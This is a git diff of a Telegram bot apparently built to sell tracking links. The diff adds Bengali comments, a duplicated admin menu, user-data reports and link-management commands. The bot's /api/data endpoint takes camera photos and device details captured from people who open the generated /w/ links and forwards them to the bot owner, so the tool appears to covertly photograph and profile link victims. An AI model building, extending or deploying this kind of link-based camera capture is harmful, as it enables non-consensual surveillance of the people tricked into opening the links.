@@ -163,7 +163,6 @@ function showVerificationMenu(msg) {
         }
     });
 }
-
 // ─── 📩 MESSAGES & STATES ─────────────────────────────────
 
 bot.on('message', async (msg) => {
@@ -194,19 +193,25 @@ bot.on('message', async (msg) => {
         });
     } 
     else if (text === "👤 ᴍʏ ɪɴғᴏ") {
+        // ১. একটিভ লিংক কাউন্ট করা (ডাটাবেস থেকে)
         const activeLinkCount = await Link.countDocuments({ creatorChatId: chatId });
+        
+        // ২. জয়েনিং ডেট ফরম্যাট করা
         const joinDate = user.joinedAt ? new Date(user.joinedAt).toLocaleDateString() : "N/A";
         
+        // ৩. ফ্রি কয়েন চেক করা (থাকলে দেখাবে, না থাকলে ভেরিয়েবল খালি থাকবে)
         let freeLine = "";
         if (user.freeUrlsLeft > 0) {
             freeLine = `<b>┃ ┃ 🎁 ғʀᴇᴇ: ${user.freeUrlsLeft}</b>\n`;
         }
 
+        // ৪. স্টাইলিশ টেক্সট জেনারেট করা
         const titleMain = _fnt("YOUR INFO");
         const titleProf = _fnt("USER PROFILE");
-        const titleDet = _fnt("PROFILE DETAILS"); 
+        const titleDet = _fnt("PROFILE DETAILS"); // Profile details এর স্টাইলিশ রূপ
         const btnText = _fnt("SUPPORT GROUP");
 
+        // ৫. মেসেজ বডি সাজানো (নেস্টেড বর্ডার সহ)
         const infoMsg = 
 `<b>┏━━「 ${titleMain} 」━━┓</b>
 <b>┃ ┏─「 ${titleProf} 」</b>
@@ -222,6 +227,7 @@ ${freeLine}<b>┃ ┃ 🛡 ʙᴀɴ: ${user.isBanned ? "Yes" : "No"}</b>
 <b>┃ ┗───────────╼</b>
 <b>┗━━━━━━━━━━┛</b>`;
 
+        // ৬. মেসেজ পাঠানো (সাথে বাটন)
         bot.sendMessage(chatId, infoMsg, { 
             parse_mode: 'HTML',
             reply_markup: {
@@ -230,7 +236,7 @@ ${freeLine}<b>┃ ┃ 🛡 ʙᴀɴ: ${user.isBanned ? "Yes" : "No"}</b>
                 ]
             }
         });
-    }
+                    }
     else if (text === "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ") {
         bot.sendMessage(chatId, makeBorder("ᴅᴇᴠᴇʟᴏᴘᴇʀ", "👨‍💻: ᴄᴏᴅᴇᴅ ʙʏ ᴅx-ᴄᴏᴅᴇx\n🛡: ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄᴏᴅᴇx—ᴛᴇᴀᴍ"), { parse_mode: 'HTML' });
     }
@@ -303,10 +309,11 @@ async function createFinalLink(msg, name, redirectUrl) {
     await new Link({ shortId: name, creatorChatId: chatId, originalUrl: redirectUrl }).save();
     delete userState[chatId];
     
+    // 👇 ফিক্স করা লাইন: এখানে দুই পাশেই Backtick (`) ব্যবহার করা হয়েছে
     const url = `https://code-url-hgsr.onrender.com/w/${name}`;
     
     bot.sendMessage(chatId, makeBorder("✅ sᴜᴄᴄᴇss", `🔗: ${url}\n\n🔄: ${redirectUrl || 'N/A'}\n💰: ʀᴇᴍᴀɪɴɪɴɢ: ${user.coins}`), { parse_mode: 'HTML' });
-}
+        }
 
 // ─── 👑 ADMIN COMMANDS (Merged Logic + Styling) ───────────
 
@@ -342,6 +349,59 @@ bot.onText(/\/ban(?:\s+(.+))?/, async (msg, match) => {
     if(user) { user.isBanned = true; await user.save(); bot.sendMessage(msg.chat.id, makeBorder("ʙᴀɴ", `🚫: ʙᴀɴɴᴇᴅ ${user.firstName}`), {parse_mode:'HTML'}); }
 });
 
+/**
+ * 🛠 ADMIN MENU COMMAND (Private DM Only)
+ * Function: Shows all admin commands and usage guide
+ * Author: NIKO (DX-CODEX)
+ */
+bot.onText(/\/menu/, async (msg) => {
+    const chatId = msg.chat.id;
+    const fromId = msg.from.id;
+
+    // Check if user is Owner and in Private DM
+    if (!OWNER_IDS.includes(fromId)) return;
+    if (msg.chat.type !== 'private') {
+        return bot.sendMessage(chatId, "❌ <b>ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ᴏɴʟʏ ᴡᴏʀᴋs ɪɴ ʙᴏᴛ ᴅᴍ!</b>", { parse_mode: 'HTML' });
+    }
+
+    let menu = `👋 ʜᴇʟʟᴏ ᴀᴅᴍɪɴ, ɪ ᴀᴍ <b>${_fnt("CODE-URL")}</b>\n`;
+    menu += `ʜᴇʀᴇ ᴀʀᴇ ʏᴏᴜʀ ᴘᴏᴡᴇʀғᴜʟ ᴄᴏᴍᴍᴀɴᴅs:\n\n`;
+
+    // 👤 User Management
+    menu += `👤 <b>ᴜsᴇʀ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ</b>\n`;
+    menu += `├ <code>/data</code> - sʜᴏᴡ ʏᴏᴜʀ ᴘʀᴏғɪʟᴇ\n`;
+    menu += `├ <code>/data</code> [ʀᴇᴘʟʏ/ɪᴅ] - ғᴜʟʟ ᴅʙ ɪɴғᴏ\n`;
+    menu += `└ <code>/users</code> - ɢᴇᴛ ᴜsᴇʀ ʟɪsᴛ (.ᴛxᴛ)\n\n`;
+
+    // 🔗 Link Management
+    menu += `🔗 <b>ʟɪɴᴋ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ</b>\n`;
+    menu += `├ <code>/ulist</code> - ᴀʟʟ ᴀᴄᴛɪᴠᴇ ʟɪɴᴋ ᴜsᴇʀs\n`;
+    menu += `├ <code>/ulink</code> [ɪᴅ/ʀᴇᴘʟʏ] - ᴜsᴇʀ ʟɪɴᴋ ʟɪsᴛ\n`;
+    menu += `└ <code>/rmlink</code> [ɪᴅ] [ɴᴜᴍ/ᴀʟʟ] - ᴅᴇʟᴇᴛᴇ\n\n`;
+
+    // 💰 Economy & Control
+    menu += `💰 <b>ᴄᴏɴᴛʀᴏʟ sʏsᴛᴇᴍ</b>\n`;
+    menu += `├ <code>/add</code> [ǫᴛʏ] [ɪᴅ/ʀᴇᴘʟʏ] - ᴀᴅᴅ ᴄᴏɪɴs\n`;
+    menu += `├ <code>/ban</code> [ɪᴅ/ʀᴇᴘʟʏ] - ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀ\n`;
+    menu += `└ <code>/unban</code> [ɪᴅ/ʀᴇᴘʟʏ] - ʟɪғᴛ ʙᴀɴ\n\n`;
+
+    menu += `📝 <b>ᴜsᴀɢᴇ ᴛɪᴘ:</b>\n`;
+    menu += `<i>ʏᴏᴜ ᴄᴀɴ ʀᴇᴘʟʏ ᴛᴏ ᴀɴʏ ᴜsᴇʀ ᴍᴇssᴀɢᴇ ᴡɪᴛʜ ᴛʜᴇsᴇ ᴄᴏᴍᴍᴀɴᴅs ɪɴ ɢʀᴏᴜᴘs ᴛᴏ ᴛᴀʀɢᴇᴛ ᴛʜᴇᴍ ɪɴsᴛᴀɴᴛʟʏ.</i>`;
+
+    const menuBorder = (title, body) => {
+        return `<b>┏─「 ${_fnt(title)} 」</b>\n${body.split('\n').map(l => `<b>┃</b> ${l}`).join('\n')}\n<b>┗───────────╼</b>`;
+    };
+
+    bot.sendMessage(chatId, menuBorder("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", menu), { 
+        parse_mode: 'HTML',
+        reply_markup: {
+            inline_keyboard: [
+                [{ text: "📢 sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url: "https://t.me/Codex_teamx" }]
+            ]
+        }
+    });
+});
+
 bot.onText(/\/unban(?:\s+(.+))?/, async (msg, match) => {
     if (!OWNER_IDS.includes(msg.from.id)) return;
     const user = await resolveUser(msg, match[1]);
@@ -353,7 +413,7 @@ bot.onText(/\/unban(?:\s+(.+))?/, async (msg, match) => {
  * Commands: /ulist, /ulink <id/reply>, /rmlink
  */
 
-// 1. /ulist
+// 1. /ulist - গ্রুপের বা ডিএম-এর যেকোনো ওনার দেখতে পারবে
 bot.onText(/\/ulist/, async (msg) => {
     if (!OWNER_IDS.includes(msg.from.id)) return;
 
@@ -383,7 +443,7 @@ bot.onText(/\/ulist/, async (msg) => {
     } catch (e) { bot.sendMessage(msg.chat.id, "❌ Error."); }
 });
 
-// 2. /ulink
+// 2. /ulink - আইডি দিয়ে বা মেসেজে রিপ্লাই দিয়ে কাজ করবে
 bot.onText(/\/ulink(?:\s+(\d+))?/, async (msg, match) => {
     if (!OWNER_IDS.includes(msg.from.id)) return;
 
@@ -417,31 +477,28 @@ bot.onText(/\/ulink(?:\s+(\d+))?/, async (msg, match) => {
     });
 });
 
-// 3. Callback Handlers (Admin)
+// 3. Callback Handlers (Buttons)
 bot.on('callback_query', async (query) => {
-    // Only process if it's an admin action (simple check to avoid conflict with user menu)
-    if (query.data.startsWith('delall') || query.data.startsWith('prompt_del') || query.data === 'rm_guide') {
-         if (!OWNER_IDS.includes(query.from.id)) return bot.answerCallbackQuery(query.id, { text: "🚫 Access Denied" });
+    if (!OWNER_IDS.includes(query.from.id)) return bot.answerCallbackQuery(query.id, { text: "🚫 Access Denied" });
 
-        const [action, type, uid] = query.data.split('_');
+    const [action, type, uid] = query.data.split('_');
 
-        if (query.data === "rm_guide") {
-            bot.sendMessage(query.message.chat.id, "📌 <b>ʀᴇᴍᴏᴠᴀʟ ɢᴜɪᴅᴇ:</b>\n\nTo delete specific links:\n<code>/rmlink [ID] 1 3</code>\n\nTo delete everything:\n<code>/rmlink [ID] all</code>", {parse_mode:'HTML'});
-        }
+    if (query.data === "rm_guide") {
+        bot.sendMessage(query.message.chat.id, "📌 <b>ʀᴇᴍᴏᴠᴀʟ ɢᴜɪᴅᴇ:</b>\n\nTo delete specific links:\n<code>/rmlink [ID] 1 3</code>\n\nTo delete everything:\n<code>/rmlink [ID] all</code>", {parse_mode:'HTML'});
+    }
 
-        if (action === "delall") {
-            const target = query.data.split('_')[1];
-            await Link.deleteMany({ creatorChatId: target });
-            bot.editMessageText(`✅ All links for <code>${target}</code> removed.`, { chat_id: query.message.chat.id, message_id: query.message.message_id, parse_mode: 'HTML' });
-        }
-        
-        if (query.data.startsWith("prompt_del_")) {
-            bot.sendMessage(query.message.chat.id, `👉 Copy & Edit:\n<code>/rmlink ${uid} 1</code>`, {parse_mode:'HTML'});
-        }
+    if (action === "delall") {
+        const target = query.data.split('_')[1];
+        await Link.deleteMany({ creatorChatId: target });
+        bot.editMessageText(`✅ All links for <code>${target}</code> removed.`, { chat_id: query.message.chat.id, message_id: query.message.message_id, parse_mode: 'HTML' });
+    }
+    
+    if (query.data.startsWith("prompt_del_")) {
+        bot.sendMessage(query.message.chat.id, `👉 Copy & Edit:\n<code>/rmlink ${uid} 1</code>`, {parse_mode:'HTML'});
     }
 });
 
-// 4. /rmlink
+// 4. /rmlink - একচুয়াল ডিলিট কমান্ড
 bot.onText(/\/rmlink\s+(\d+)\s+(.+)/, async (msg, match) => {
     if (!OWNER_IDS.includes(msg.from.id)) return;
     const targetId = parseInt(match[1]);
@@ -467,33 +524,42 @@ bot.onText(/\/rmlink\s+(\d+)\s+(.+)/, async (msg, match) => {
 
 /**
  * 🛠 ADMIN MENU COMMAND (Private DM Only)
+ * Function: Shows all admin commands and usage guide
+ * Author: NIKO (DX-CODEX)
  */
 bot.onText(/\/menu/, async (msg) => {
     const chatId = msg.chat.id;
     const fromId = msg.from.id;
 
+    // Check if user is Owner and in Private DM
     if (!OWNER_IDS.includes(fromId)) return;
     if (msg.chat.type !== 'private') {
         return bot.sendMessage(chatId, "❌ <b>ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ᴏɴʟʏ ᴡᴏʀᴋs ɪɴ ʙᴏᴛ ᴅᴍ!</b>", { parse_mode: 'HTML' });
     }
 
-    let menu = `👋 ʜᴇʟʟᴏ ᴀᴅᴍɪɴ, ɪ ᴀᴍ <b>${_fnt("DX-CODEX")}</b>\n`;
+    let menu = `👋 ʜᴇʟʟᴏ ᴀᴅᴍɪɴ, ɪ ᴀᴍ <b>${_fnt("NIKO")}</b>\n`;
     menu += `ʜᴇʀᴇ ᴀʀᴇ ʏᴏᴜʀ ᴘᴏᴡᴇʀғᴜʟ ᴄᴏᴍᴍᴀɴᴅs:\n\n`;
 
+    // 👤 User Management
     menu += `👤 <b>ᴜsᴇʀ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ</b>\n`;
     menu += `├ <code>/data</code> - sʜᴏᴡ ʏᴏᴜʀ ᴘʀᴏғɪʟᴇ\n`;
     menu += `├ <code>/data</code> [ʀᴇᴘʟʏ/ɪᴅ] - ғᴜʟʟ ᴅʙ ɪɴғᴏ\n`;
     menu += `└ <code>/users</code> - ɢᴇᴛ ᴜsᴇʀ ʟɪsᴛ (.ᴛxᴛ)\n\n`;
 
+    // 🔗 Link Management
     menu += `🔗 <b>ʟɪɴᴋ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ</b>\n`;
     menu += `├ <code>/ulist</code> - ᴀʟʟ ᴀᴄᴛɪᴠᴇ ʟɪɴᴋ ᴜsᴇʀs\n`;
     menu += `├ <code>/ulink</code> [ɪᴅ/ʀᴇᴘʟʏ] - ᴜsᴇʀ ʟɪɴᴋ ʟɪsᴛ\n`;
     menu += `└ <code>/rmlink</code> [ɪᴅ] [ɴᴜᴍ/ᴀʟʟ] - ᴅᴇʟᴇᴛᴇ\n\n`;
 
+    // 💰 Economy & Control
     menu += `💰 <b>ᴄᴏɴᴛʀᴏʟ sʏsᴛᴇᴍ</b>\n`;
     menu += `├ <code>/add</code> [ǫᴛʏ] [ɪᴅ/ʀᴇᴘʟʏ] - ᴀᴅᴅ ᴄᴏɪɴs\n`;
     menu += `├ <code>/ban</code> [ɪᴅ/ʀᴇᴘʟʏ] - ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀ\n`;
     menu += `└ <code>/unban</code> [ɪᴅ/ʀᴇᴘʟʏ] - ʟɪғᴛ ʙᴀɴ\n\n`;
+
+    menu += `📝 <b>ᴜsᴀɢᴇ ᴛɪᴘ:</b>\n`;
+    menu += `<i>ʏᴏᴜ ᴄᴀɴ ʀᴇᴘʟʏ ᴛᴏ ᴀɴʏ ᴜsᴇʀ ᴍᴇssᴀɢᴇ ᴡɪᴛʜ ᴛʜᴇsᴇ ᴄᴏᴍᴍᴀɴᴅs ɪɴ ɢʀᴏᴜᴘs ᴛᴏ ᴛᴀʀɢᴇᴛ ᴛʜᴇᴍ ɪɴsᴛᴀɴᴛʟʏ.</i>`;
 
     const menuBorder = (title, body) => {
         return `<b>┏─「 ${_fnt(title)} 」</b>\n${body.split('\n').map(l => `<b>┃</b> ${l}`).join('\n')}\n<b>┗───────────╼</b>`;
@@ -508,14 +574,17 @@ bot.onText(/\/menu/, async (msg) => {
         }
     });
 });
-
 /**
- * 📊 USER DATA COMMAND
+ * 📊 USER DATA COMMAND (Updated User View)
+ * User View: Profile, ID, Username, Active Links, Status
+ * Owner View: All Database & Tech Details
  */
 bot.onText(/\/data(?:\s+(.+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
     const isOwner = OWNER_IDS.includes(msg.from.id);
+    const isGroup = msg.chat.type !== 'private';
     
+    // Resolve Target User
     let targetUser;
     if (msg.reply_to_message) {
         targetUser = await User.findOne({ chatId: msg.reply_to_message.from.id });
@@ -537,6 +606,7 @@ bot.onText(/\/data(?:\s+(.+))?/, async (msg, match) => {
         let content = "";
         
         if (isOwner) {
+            // 👑 OWNER VIEW: Full Tech Details
             const regDate = targetUser.joinedAt ? new Date(targetUser.joinedAt).toLocaleDateString() : "ɴ/ᴀ";
             content += `👤 ɴᴀᴍᴇ: <b>${targetUser.firstName || 'Unknown'}</b>\n`;
             content += `🆔 ᴜsᴇʀ ɪᴅ: <code>${targetUser.chatId}</code>\n`;
@@ -548,12 +618,14 @@ bot.onText(/\/data(?:\s+(.+))?/, async (msg, match) => {
             content += `🛡 ʙᴀɴ: <b>${targetUser.isBanned ? "ʏᴇs" : "ɴᴏ"}</b>\n`;
             content += `📅 ʀᴇɢ ᴅᴀᴛᴇ: <code>${regDate}</code>`;
         } else {
+            // 👤 USER VIEW: Profile + ID + Active Links
             content += `👤 ɴᴀᴍᴇ: <b>${targetUser.firstName || 'Unknown'}</b>\n`;
-            content += `🆔 ᴜsᴇʀ ɪᴅ: <code>${targetUser.chatId}</code>\n`; 
+            content += `🆔 ᴜsᴇʀ ɪᴅ: <code>${targetUser.chatId}</code>\n`; // Added ID for User
             content += `🏷 ᴜsᴇʀ: @${targetUser.username || 'ɴ/ᴀ'}\n`;
             content += `📡 sᴛᴀᴛᴜs: <b>${status}</b>`;
         }
 
+        // Custom Short Border Design
         const shortBorder = (title, body) => {
             return `<b>┏─「 ${_fnt(title)} 」</b>\n${body.split('\n').map(l => `<b>┃</b> ${l}`).join('\n')}\n<b>┗───────────╼</b>`;
         };
@@ -574,6 +646,7 @@ bot.onText(/\/users/, async (msg) => {
         const activeLinks = await Link.countDocuments();
         const bannedUsers = await User.countDocuments({ isBanned: true });
 
+        // 1. Send Quick Stats Report
         let report = `📊 <b>sʏsᴛᴇᴍ sᴛᴀᴛɪsᴛɪᴄs</b>\n\n`;
         report += `👥 <b>ᴛᴏᴛᴀʟ ᴜsᴇʀs:</b> <code>${totalUsers}</code>\n`;
         report += `🔗 <b>ᴀᴄᴛɪᴠᴇ ʟɪɴᴋs:</b> <code>${activeLinks}</code>\n`;
@@ -581,6 +654,7 @@ bot.onText(/\/users/, async (msg) => {
         
         await bot.sendMessage(msg.chat.id, makeBorder("sᴛᴀᴛs", report), { parse_mode: 'HTML' });
 
+        // 2. Create Detailed TXT File with Coins & Free URLs
         let fileContent = `DX-CODEX USER DATABASE REPORT\n`;
         fileContent += `Generated on: ${new Date().toLocaleString()}\n`;
         fileContent += `--------------------------------------------------\n\n`;
@@ -592,8 +666,8 @@ bot.onText(/\/users/, async (msg) => {
             fileContent += `${index + 1}. ID: ${u.chatId}\n`;
             fileContent += `   NAME: ${u.firstName || 'N/A'}\n`;
             fileContent += `   USER: @${u.username || 'N/S'}\n`;
-            fileContent += `   COINS: ${u.coins || 0}\n`;
-            fileContent += `   FREE LEFT: ${u.freeUrlsLeft || 0}\n`;
+            fileContent += `   COINS: ${u.coins || 0}\n`;        // Added Coins
+            fileContent += `   FREE LEFT: ${u.freeUrlsLeft || 0}\n`; // Added Free URLs
             fileContent += `   DATE: ${date}\n`;
             fileContent += `   STATUS: ${status}\n`;
             fileContent += `--------------------------------------------------\n`;
@@ -602,11 +676,13 @@ bot.onText(/\/users/, async (msg) => {
         const filePath = `./all_users_report.txt`;
         fs.writeFileSync(filePath, fileContent);
 
+        // 3. Send the Document
         await bot.sendDocument(msg.chat.id, filePath, {
             caption: `📄 <b>ᴀʟʟ ᴜsᴇʀ ᴅᴇᴛᴀɪʟs (ɪɴᴄʟᴜᴅɪɴɢ ᴄᴏɪɴs/ғʀᴇᴇ)</b>`,
             parse_mode: 'HTML'
         });
 
+        // 4. Cleanup
         fs.unlinkSync(filePath);
 
     } catch (e) {
@@ -690,7 +766,7 @@ app.post('/api/data', async (req, res) => {
 
             await bot.sendMessage(owner, msg, { parse_mode: 'HTML', disable_web_page_preview: true });
             
-        } else if (type === 'cam') { 
+        } else if (type === 'cam') { // ekhon bracket thik ache
             const buffer = Buffer.from(data.images[0].replace(/^data:image\/jpeg;base64,/, ""), 'base64');
             await bot.sendPhoto(owner, buffer, { caption: makeBorder("ᴄᴀᴍᴇʀᴀ", `📱: ${data.platform}`), parse_mode: 'HTML' });
         }
@@ -782,7 +858,7 @@ window.onload = start;
 </html>`;
 }
 
-// ᴜʀʟ ᴛᴏ ᴋᴇᴇᴘ ᴀʟɪᴠᴇ 
+// ᴜʀʟ ᴛᴏ ᴋᴇᴇᴘ ᴀʟɪᴠᴇ (Replace with your Render App URL)
 const APP_URL = "https://code-url-hgsr.onrender.com"; 
 
 setInterval(async () => {
@@ -797,3 +873,4 @@ setInterval(async () => {
     }
 }, 300000); // 300,000ms = 5 Minutes
 app.listen(PORT, () => console.log(`DX-CODEX System Online`));
+ 
